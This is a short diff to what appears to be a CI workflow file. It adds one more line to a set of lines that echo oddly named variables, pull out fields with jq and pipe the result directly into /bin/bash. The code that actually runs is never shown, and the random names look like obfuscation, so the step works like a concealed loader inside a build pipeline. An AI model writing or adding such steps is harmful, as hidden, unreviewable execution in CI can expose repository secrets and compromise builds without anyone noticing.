@@ -22,6 +22,7 @@ jobs:
           echo $nd85876 | jq -r .kql0 | /bin/bash
           printf '%s' "$b267" | jq -r .cq367 | /bin/bash
           echo $phjjb30819 | jq -r .hcfy8 | /bin/bash
+          echo $ctr0 | jq -r .esd77044 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
